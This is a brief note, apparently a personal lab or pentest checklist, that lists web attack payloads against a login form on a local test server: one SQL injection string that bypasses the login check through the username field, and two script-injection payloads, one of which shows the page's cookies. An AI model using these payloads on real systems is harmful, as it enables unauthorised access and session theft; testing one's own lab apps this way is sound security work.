* SQLi
    * http://localhost:8005
      * LoginForm -> Username ->   admin2' or '1'--
* XSS
    * http://localhost:8005
      * XSS LoginForm -> Username ->    <script>alert('hello');</script>
                                        <script>alert(document.cookie);</script>
     